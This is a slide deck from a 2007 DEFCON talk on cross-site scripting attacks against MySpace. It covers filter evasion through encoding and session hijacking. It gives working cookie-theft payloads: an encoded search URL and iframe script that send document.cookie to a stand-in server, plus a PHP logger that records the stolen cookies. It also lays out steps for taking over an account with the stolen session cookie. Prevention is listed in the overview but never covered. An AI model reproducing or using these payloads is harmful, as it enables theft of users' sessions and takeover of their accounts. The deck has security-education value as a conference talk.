# Hacking Social Lives: MySpace.com
## Presented By Rick Deacon
### DEFCON 15, August 3-5, 2007

## A Quick Introduction
- **Professional Background**:
  - Full-time IT Specialist at a CPA firm in Beachwood, OH.
  - Part-time Student at Lorain County Community College and the University of Akron.
  - Pursuing a Bachelor’s degree in Computer Information Systems with a focus on Networking.
  - 7 years of experience in Information Technology, 4 years in security.
  - Published in 2600 Magazine.
- **Other Interests**: Cars, Music.

## Presentation Overview
1. **Introduction to MySpace.com**
2. **Introduction to Cross Site Scripting (XSS)**
3. **Evading XSS Filters**
4. **MySpace Session Information and Hijacking**
5. **Tools Used to Exploit MySpace’s XSS**
6. **Current 0-Day Exploit and Demonstration**
7. **Ways to Prevent XSS Attacks**
8. **Questions and Closing**

## Introduction to MySpace.com
- **Overview**:
  - One of the largest social networking sites on the internet with millions of active users.
  - Driven by various dynamic web applications including blogs, pictures, videos, chat, IM, searches, classifieds, music, and bulletins.
  - Has a major impact on today’s society, serving as a source of social interaction and influencing television, radio, movies, and publications.

## MySpace’s Security
- **Vulnerabilities**:
  - Susceptible to many types of attacks such as social engineering, phishing, packet capture, viruses, spam, and cross-site scripting (XSS).
- **Notable Incidents**:
  - **Samy Virus**: Used a worm to "Add" millions of people using XSS and clever scripting.
  - **QuickTime Virus**: Spread a MySpace virus by automatically editing profiles and adding phishing links when played.
  - **Windows MetaFile Vulnerability**: Phishing links sent through compromised profiles to steal passwords and advertise.

## Introduction to Cross Site Scripting (XSS)
- **Definition**:
  - A vulnerability found in many web applications that allows code injection (HTML, JavaScript, etc.).
  - Can be used for phishing, browser exploitation, session hijacking, and cookie stealing.
  - Easily identifiable with proper methods.

## Finding XSS Holes
- **Methods**:
  - Easiest method is to try and insert code into an application.
  - Example: Embed JavaScript into a URL to display an alert.
    - `http://trustedsite.org/search.cgi?criteria=<script>alert('XSS')</script>`
  - More information on XSS and how to identify holes can be found with a quick Google search.

## XSS Hole Exploits
- **Purposes**:
  - Commonly used for cookie stealing/session information stealing.
  - Cookie stealing can lead to information leakage and session hijacking.
- **Explanation**:
  1. Attacker sends an authenticated user a link containing XSS.
  2. The link takes the user to a site that logs their cookie.
  3. The attacker reviews the log file and steals the necessary information.

## MySpace & XSS
- **Cookie Usage**:
  - MySpace uses cookies that contain session and login information, email addresses, and past search criteria.
  - Cookies may also contain encrypted passwords.
  - Session information can be used for session hijacking.
  - MySpace has hundreds of undetected and undiscovered XSS vulnerabilities, making it open to pen-testing and attack.

## MySpace’s XSS Filters
- **Filter Mechanism**:
  - MySpace deploys XSS filters that look for `<script>` tags or other disallowed tags.
  - Filters censor these tags into "..".
  - Filters have closed/hindered many XSS attacks but are not consistent throughout the site.
  - Some parts of the site are more liberal with tag allowances than others.

## Evading MySpace’s Filters
- **Encoding Techniques**:
  - Filters can be evaded using encoding (ASCII to HEX or Unicode).
  - Simple encoding of `<script>` to `%3cscript%3e` can evade the filter.
  - Many evasions have been patched, but many have not.
- **Additional Evasion Methods**:
  - Trial and error is often the best approach.
  - For detailed explanations and evasion techniques, visit: [ha.ckers.org/xss.html](http://ha.ckers.org/xss.html)

## Previous Exploits & Evasion
- **Exploit Example**:
  - Uses the “Browse” function and was found through trial and error.
  - Vulnerability lies within the User Search feature.
  - This exploit was used to steal cookies and hijack user sessions to take full control of accounts.
  - The exploit has been patched.

### Encoded URL for “Browse” Exploit
```plaintext
http://searchresults.myspace.com/index.cfm?fuseaction=advancedFind.results&websearch=1&spotID=3&searchrequest=%22%3E%3Cdocument.location='http://www.yourwebserver.com/cgi/cookiestealer.cgi%3F%20'+document.cookie%3c/script%3e
```

## Captured Cookies
- **Session & Cookie Breakdown**:
  - The cookie contains last display name, last logged-in email, last search page, and other information.
  - Contains current session information called `MYUSERINFO`.
  - Session information is valid until the user logs out.

### MYUSERINFO Example
```plaintext
MYUSERINFO=MIHnBgkrBgEEAYI3WAOggdkwgdYG... (truncated for brevity)
```

## Session Hijacking
- **Process**:
  - `MYUSERINFO` can be used to hijack the current session of the user.
  - Once the user clicks the provided link, review the log file.
  - Copy and paste the stolen `MYUSERINFO` into your current MySpace cookie and refresh the browser.
  - You are now the user.

## 0-Day Explanation
- **Exploit Details**:
  - This exploit involves MySpace’s "Domain Generalization."
  - MySpace does not perform any XSS filtering on cross-domain linking.
  - Place a page with an IFrame containing MySpace on your web server and use XSS to steal the cookie.
  - The user needs to click the provided link, which can be easily hidden.

### IFrame Code
```html
<iframe src="http://myspace.com"></iframe>
<script>document.write('<iframe src="http://yourserver.com/steal.php?cookie='+document.cookie+'"></iframe>');</script>
```

### PHP File
```php
<?php
$cookie = $_GET['cookie'];
file_put_contents('log.txt', $cookie . "\n", FILE_APPEND);
?>
```

### URL
```plaintext
http://yourserver.com/exploit.html
```

### Limitations
- **User Requirements**:
  - The user must be using Mozilla Firefox.
  - The session only lasts until the user logs out.
  - The person will know what link they recently clicked and who it was from.
  - There is a risk of hurting friends' feelings.

## Demonstration

## Tools
- **Used Tools**:
  - Mozilla Firefox
  - Add N Edit Cookies (Firefox Extension)
  - Notepad (for script editing)
  - Brain (or lack thereof)

- **Useful Penetration Testing Tools**:
  - **Mozilla Firefox Extensions**:
    - Tamper Data: Edit and view HTTP requests.
    - Add N Edit Cookies: Edit cookies.
    - Firebug: Debug and modify web code actively.
    - Firekeeper: Firefox IDS.
    - HackBar: SQL Injection/XSS hole finder.
    - SwitchProxy: Torbutton for use with Tor and Vidalia.
  - **Other Tools**:
    - Tor/Vidalia: P2P proxy.
    - Paros: Web vulnerability scanning proxy.
    - Acunetix Web Vulnerability Scanner.
    - Nikto/Wikto: Web pen testing utilities for Linux and Windows.

## Questions?
- **Closing**:
  - Thank you for your attention. Any questions?